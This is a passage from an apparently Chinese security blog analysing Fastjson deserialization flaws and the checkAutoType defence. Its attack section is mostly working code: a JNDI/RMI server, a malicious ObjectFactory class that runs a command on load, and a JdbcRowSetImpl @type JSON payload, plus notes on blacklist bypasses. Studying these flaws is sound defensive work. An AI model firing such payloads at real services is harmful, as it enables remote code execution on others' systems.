</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>exec:348, Runtime (java.lang)
</span></span><span style="display:flex;"><span>&lt;init&gt;:19, badClassName (com.reus09)
</span></span><span style="display:flex;"><span>newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:423, Constructor (java.lang.reflect)
</span></span><span style="display:flex;"><span>newInstance:442, Class (java.lang)
</span></span><span style="display:flex;"><span>getObjectFactoryFromReference:174, NamingManager (javax.naming.spi)
</span></span><span style="display:flex;"><span>getObjectInstance:330, NamingManager (javax.naming.spi)
</span></span><span style="display:flex;"><span>decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
</span></span><span style="display:flex;"><span>lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
</span></span><span style="display:flex;"><span>lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
</span></span><span style="display:flex;"><span>lookup:417, InitialContext (javax.naming)
</span></span><span style="display:flex;"><span>connect:624, JdbcRowSetImpl (com.sun.rowset)
</span></span><span style="display:flex;"><span>setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
</span></span><span style="display:flex;"><span>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:498, Method (java.lang.reflect)
</span></span><span style="display:flex;"><span>setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:137, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>parse:128, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>main:123, FastJsonTest (com.reus09)
</span></span></code></pre></td></tr></table>
</div>
</div><p>先看一下 <code>setAutoCommit()</code> 方法，在 <code>conn</code> 为空时，将会调用 <code>connect()</code> 方法。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012170224510.png" alt="image-20221012170224510"  />
</p>
<p>然后在<code>connect</code>方法里面调用了 <code>javax.naming.InitialContext#lookup()</code> 方法，参数从成员变量 <code>dataSource</code> 中获取。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012170333164.png" alt="image-20221012170333164"  />
</p>
<ul>
<li>通过函数栈的变化，可以很明显的看到，在<code>FastJson</code>解析函数<code>parse</code>函数作用的时候，通过反射给类的元素赋值的时候引起的命令执行。在<code>FieldDeserialize#setValue</code>方法，然后执行<code>setAutoCommit()</code>方法，进而实现反序列化。</li>
</ul>
<p>编写一个<code>JNDI</code>服务</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.NamingException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Reference;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.AlreadyBoundException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.RemoteException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.registry.LocateRegistry;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.registry.Registry;
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName JDNIServer
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/12 18:09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> JDNIServer {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> RemoteException, NamingException, AlreadyBoundException {
</span></span><span style="display:flex;"><span>        Registry registry = LocateRegistry.<span style="color:#007f7f">createRegistry</span>(<span style="color:#ff0;font-weight:bold">1099</span>);
</span></span><span style="display:flex;"><span>        Reference reference = <span style="color:#fff;font-weight:bold">new</span> Reference(<span style="color:#0ff;font-weight:bold">&#34;com.reus09.badClassName&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;com.reus09.badClassName&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;http://127.0.0.1:8000/&#34;</span>);
</span></span><span style="display:flex;"><span>        ReferenceWrapper referenceWrapper = <span style="color:#fff;font-weight:bold">new</span> ReferenceWrapper(reference);
</span></span><span style="display:flex;"><span>        registry.<span style="color:#007f7f">bind</span>(<span style="color:#0ff;font-weight:bold">&#34;Exploit&#34;</span>,referenceWrapper);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Context;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Name;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.spi.ObjectFactory;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Hashtable;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> badClassName <span style="color:#fff;font-weight:bold">implements</span> ObjectFactory {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> badClassName() <span style="color:#fff;font-weight:bold">throws</span> IOException {
</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>Payload</code>部分</p>
<ul>
<li>
<p>JSON格式</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;dataSourceName&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;rmi://127.0.0.1:1099/Exploit&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;autoCommit&#34;</span>:<span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>代码</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// 解决java版本过高的问题，默认以下的元素都为false 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.cosnaming.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;JdbcRowSetImpl  链的利用&#34;</span>);
</span></span><span style="display:flex;"><span>String payload2 = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/Exploit\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span>;
</span></span><span style="display:flex;"><span>JSON.<span style="color:#007f7f">parse</span>(payload2);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012184649052.png" alt="image-20221012184649052"  />
</p>
</li>
</ul>
<h2 id="autotype与checkautotype">AutoType与checkAutoType<a hidden class="anchor" aria-hidden="true" href="#autotype与checkautotype">#</a></h2>
<p>Fastjson提供了autotype功能,允许用户在反序列化数据中通过<code>“@type”</code>指定反序列化的Class类型。</p>
<p>简单的来说就是：当一个类中包含了一个接口（或抽象类）的时候，在正常反序列化中，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。<code>FastJson</code>通过使用<code>autotype</code>来对指定的<code>@type</code>实现的接口同样进行正常反序列化。</p>
<p>具体的话，看<a href="https://www.cnpanda.net/sec/1183.html">panda师傅</a>对<code>AutoType</code>起到的作用进行了简单的介绍。</p>
<p>checkAutoType是 FastJson 在 1.2.25 以及之后的版本中，为了防止 autoType 这一机制带来的 安全隐患，增加的检测防御机制，这是一个对于 @type 属性进行白名单+黑名单的限制机制。</p>
<p>早期版本的checkAutoType存在一些比较低级的绕过方法，如加上L开头;结尾、双写LL绕过 等，直到1.2.48版本后，checkAutoType 变得成熟，黑名单也逐渐完善。</p>
<p>其具体逻辑，可以用《How i use json deserialization》议题的一张图片概括:</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image2976131683.png" alt="4.png"  />
</p>
<p>checkAutoType首先会对传入的typeName进行3项检测:</p>
<ul>
<li>是否是白名单中的类</li>
<li>是否在反序列化cache中(在mappings列表)</li>
<li>类有JSONType注解(如:fastjson.annotation.JSONType)</li>
</ul>
<p>如果满足以上条件，那么会直接return出去继续执行反序列化流程并且将未载入cache的类载 入cache</p>
<p>如果没有满足其中的一个条件，那么会进入另一个判断:</p>
<ul>
<li>传入的typeName是否在黑名单中</li>
<li>是否继承自RowSet、DataSource、ClassLoader等类</li>
</ul>
<p>如果满足上述条件之一，那么直接抛出错误 如果都不满足，那么会进行如下判断:</p>
<ul>
<li>expectClass不为NULL、Object、Serializable、Closeable等类型</li>
<li>传入的typeName类继承于expctClass</li>
</ul>
<p>如果满足以上条件，那么会直接return出去继续执行反序列化流程并且将未载入cache的类载 入cache</p>
<p>如果不满足，那么会经过autoTypeSupport的判断，autoTypeSupport主要用来打开autotype功能，默认情况下是false，抛出错误，如果设置的是True那么会return出去继续执行反序列化流 程并且将未载入cache的类载入cache。</p>
<h2 id="历史漏洞分析">历史漏洞分析<a hidden class="anchor" aria-hidden="true" href="#历史漏洞分析">#</a></h2>
<h3 id="fastjson-1225">fastjson-1.2.25<a hidden class="anchor" aria-hidden="true" href="#fastjson-1225">#</a></h3>
<p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</p>
<blockquote>
<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.41</code>
描述：作者通过为危险功能添加开关，并提供黑白名单两种方式进行安全防护，其实已经是相当完整的防护思路，而且作者已经意识到黑名单类将会无穷无尽，仅仅通过维护列表来防止反序列化漏洞并非最好的办法。而且靠用户自己来关注安全信息去维护也不现实。</p>
</blockquote>
<p>安全更新主要集中在 <code>com.alibaba.fastjson.parser.ParserConfig</code>，首先查看类上出现了几个成员变量：布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014185201750.png" alt="image-20221014185201750"  />
</p>
<p>其中黑名单 denyList 包括：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
